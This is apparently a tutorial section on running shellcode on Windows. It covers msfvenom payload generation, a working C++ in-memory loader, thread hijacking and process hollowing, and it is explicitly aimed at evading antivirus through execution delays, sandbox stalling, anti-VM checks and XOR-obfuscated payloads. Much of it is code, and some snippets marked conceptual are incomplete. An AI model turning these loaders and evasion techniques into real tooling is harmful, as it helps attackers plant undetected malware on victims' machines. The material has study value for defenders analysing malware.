# Index 
- [[7. Advanced Techniques]]
	- [[7.1 Code Reuse (API Unhooking and Windows Code Reuse)]]
	- [[7.2 Syscall Usage (Direct System Calls)]]
	- [[7.3 In-memory Execution (Reflective DLL Injection)]]
	- [[7.4 In-memory Execution of Shellcode (Payload Execution)]]
	- [[7.5 Reflective DLL Injection]]
	- [[7.6 Evading Dynamic Analysis (Anti-VM and Anti-Sandbox Techniques)]]

# Understanding Shellcode

Shellcode refers to a small piece of code used as the payload in the exploitation of a vulnerable system. It’s typically written in assembly language, designed to be compact, and is often used for spawning a reverse shell, manipulating processes, or even injecting a larger malware payload.

Shellcode is position-independent, meaning it can execute regardless of where it is loaded in memory. In Windows environments, shellcode is often generated using tools like Metasploit, which provides payloads for tasks like reverse shells or bind shells.

#### Example: Generating Shellcode using Metasploit
```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f c
```

This command generates shellcode in C format that executes the `calc.exe` program. The result might look like:

```c
unsigned char shellcode[] = 
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x31\xff\x31\xc0\x31\xc9"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"...";
```

You can also generate reverse shells and other payloads using similar commands. This shellcode is a sequence of raw machine instructions that will execute the desired functionality.

# Memory Allocation for Shellcode

Before executing shellcode in-memory, you need to allocate memory that can both store and execute the shellcode. This involves two key functions in the Windows API:
- `VirtualAlloc`: Used to allocate memory for shellcode with specific permissions.
- `VirtualProtect`: Used to change memory permissions if needed (e.g., from read-only to executable).

#### Memory Allocation with `VirtualAlloc`

`VirtualAlloc` allocates memory in a process's virtual address space with specific access permissions (such as read, write, or execute). To execute shellcode, you need to allocate memory with `PAGE_EXECUTE_READWRITE` permissions, which allows the shellcode to be written and executed.

Example:

```cpp
#include <windows.h>
#include <stdio.h>

// Example shellcode: executes calc.exe
unsigned char shellcode[] = {
    // Your shellcode here
};

void ExecuteShellcode() {
    // Allocate executable memory
    void* exec_mem = VirtualAlloc(
        NULL,                // Let Windows choose the address
        sizeof(shellcode),   // Size of shellcode
        MEM_COMMIT | MEM_RESERVE, // Allocate memory
        PAGE_EXECUTE_READWRITE    // Read, Write, and Execute permissions
    );

    if (exec_mem == NULL) {
        printf("Memory allocation failed!\n");
        return;
    }

    // Copy shellcode to allocated memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Create a thread that will execute the shellcode
    HANDLE hThread = CreateThread(
        NULL, 0,             // Default security and stack size
        (LPTHREAD_START_ROUTINE)exec_mem, // Thread starts with shellcode
        NULL, 0, NULL        // No arguments, default creation flags
    );

    // Wait for shellcode execution to complete
    WaitForSingleObject(hThread, INFINITE);
}

int main() {
    ExecuteShellcode();
    return 0;
}
```

This C++ code does the following:
- Allocates memory using `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` permissions.
- Copies the shellcode into the allocated memory.
- Creates a new thread using `CreateThread` that starts execution at the location of the shellcode.
- The program waits for the thread to finish using `WaitForSingleObject`.

# Injecting and Executing Shellcode

Once the shellcode is in memory, it needs to be executed. There are several common methods to inject and execute shellcode:

#### Creating a New Thread (as shown above)
This is the simplest method. By creating a new thread with `CreateThread`, you can start execution of the shellcode. However, this can be easily detected by some AVs since creating new threads with executable permissions can be suspicious.

#### Hijacking an Existing Thread

A more stealthy approach is to hijack an existing thread. This can be achieved by using functions like `SuspendThread` and `SetThreadContext`. This method modifies the instruction pointer of an existing thread to point to the shellcode, thus disguising the shellcode’s execution as part of a legitimate process.

Example (conceptual):
```cpp
// Pseudocode to inject shellcode into an existing process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTID);

// Suspend the thread
SuspendThread(hThread);

// Modify thread context to point to shellcode
CONTEXT context;
context.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &context);
context.Rip = (DWORD64)shellcode; // Set RIP (instruction pointer) to shellcode
SetThreadContext(hThread, &context);

// Resume thread execution
ResumeThread(hThread);
```

In this method, the thread is paused (`SuspendThread`), its execution context is modified to point to the shellcode, and then it’s resumed (`ResumeThread`), causing the shellcode to execute as if it were part of the target thread.

#### Process Hollowing

Process Hollowing is a technique where a legitimate process is started in a suspended state, its memory is replaced with shellcode, and then it’s resumed. This is often used by malware to hide within a legitimate process.

Steps:
1. Use `CreateProcess` to start a legitimate process in a suspended state (`CREATE_SUSPENDED`).
2. Hollow out the process memory using `ZwUnmapViewOfSection`.
3. Allocate memory in the hollowed process using `VirtualAllocEx`.
4. Write the shellcode into the process’s memory using `WriteProcessMemory`.
5. Modify the entry point of the process to the address of the shellcode.
6. Resume the process, causing the shellcode to execute.

Example (conceptual):
```cpp
// Start notepad.exe in suspended state
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Hollow out the process and inject shellcode
ZwUnmapViewOfSection(pi.hProcess, baseAddress);
VirtualAllocEx(pi.hProcess, baseAddress, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, baseAddress, shellcode, shellcodeSize, NULL);

// Modify entry point to shellcode
SetThreadContext(pi.hThread, &context);

// Resume the process
ResumeThread(pi.hThread);
```

# Anti-Detection Techniques

Modern AVs use behavioral analysis to detect malware in real-time. To avoid detection, several techniques can be employed:

#### Delaying Execution
A common anti-detection technique is to delay execution to bypass sandboxes that analyze the behavior of the binary within a short time frame (e.g., 1-2 minutes).

```cpp
// Introduce a delay before executing shellcode
Sleep(300000); // Sleep for 5 minutes
```

This can help avoid AVs that give up scanning after a certain timeout.

#### Stalling Sandboxes
Many AV sandboxes have limited CPU resources. Stalling the sandbox by performing intensive CPU operations can cause the sandbox to miss detection.

```cpp
for (int i = 0; i < 1000000; i++) {
    // Perform a no-op (or complex operation)
    __asm__("nop");
}
```

#### Environment Checks (Anti-VM and Anti-Sandbox)
Detecting if the code is running in a virtual machine or sandbox helps the malware decide whether or not to execute its payload.

For example, you can check for known artifacts of virtual environments:
- Detecting VirtualBox by checking the presence of `VBoxService.exe`.
- Checking for known virtual machine drivers or MAC addresses.

Here’s a basic check for a sandbox or VM environment:

```cpp
bool IsSandbox() {
    // Check for known VM artifacts (e.g., registry keys, processes, etc.)
    if (GetModuleHandle(L"VBoxService.exe") != NULL) {
        return true;
    }
    return false;
}

void ExecuteIfNotSandbox() {
    if (!IsSandbox

()) {
        ExecuteShellcode();  // Run the shellcode only if no sandbox detected
    }
}
```

#### Obfuscation and Encryption
Encrypting or obfuscating the shellcode can help avoid static analysis. The shellcode is decrypted at runtime before execution.

For example:
```cpp
void DecryptShellcode(unsigned char* shellcode, size_t size) {
    // XOR decryption (simple example)
    for (size_t i = 0; i < size; i++) {
        shellcode[i] ^= 0xAA; // XOR with a key
    }
}
```
